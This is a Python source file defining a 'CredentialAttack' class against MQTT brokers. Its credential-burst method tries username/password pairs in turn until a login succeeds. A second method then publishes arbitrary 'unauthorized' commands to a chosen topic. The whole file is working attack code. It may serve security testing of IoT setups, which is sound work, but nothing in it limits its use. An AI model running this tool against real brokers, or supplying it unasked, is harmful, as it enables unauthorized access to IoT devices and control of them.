import time
import paho.mqtt.client as mqtt


class CredentialAttack:

    def __init__(self, broker, port, username, password):

        self.broker = broker
        self.port = port
        self.username = username
        self.password = password

        self.connection_successful = False

    def on_connect(
        self,
        client,
        userdata,
        flags,
        reason_code,
        properties
    ):

        if reason_code == 0:
            self.connection_successful = True
        else:
            self.connection_successful = False

    def connect(self):

        self.connection_successful = False

        client = mqtt.Client(
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )

        client.on_connect = self.on_connect

        try:

            client.username_pw_set(
                self.username,
                self.password
            )

            client.connect(
                self.broker,
                self.port,
                5
            )

            client.loop_start()

            time.sleep(1)

            if self.connection_successful:

                return client

            client.loop_stop()

            return None

        except Exception:

            return None

    def single_attempt(self):

        client = self.connect()

        if client:

            client.disconnect()
            client.loop_stop()

            return {
                "success": True,
                "message": "Credential attempt successful"
            }

        return {
            "success": False,
            "message": "Credential attempt failed"
        }

    def credential_burst(self, credentials):

        results = []

        for username, password in credentials:

            self.username = username
            self.password = password

            print(
                "Trying credentials:",
                username,
                flush=True
            )

            result = self.single_attempt()

            results.append({
                "username": username,
                "success": result["success"]
            })

            if result["success"]:

                print(
                    "Valid credentials found",
                    flush=True
                )

                break

            time.sleep(0.2)

        return results

    def publish_unauthorized_command(self, topic, message):

        client = self.connect()

        if not client:

            return {
                "success": False,
                "message": "MQTT authentication failed"
            }

        try:

            result = client.publish(
                topic,
                message
            )

            time.sleep(1)

            if result.rc == mqtt.MQTT_ERR_SUCCESS:

                print(
                    "Unauthorized MQTT message published:",
                    message,
                    flush=True
                )

                return {
                    "success": True,
                    "message": "Unauthorized MQTT message published"
                }

            return {
                "success": False,
                "message": "MQTT publish failed"
            }

        finally:

            client.disconnect()
            client.loop_stop()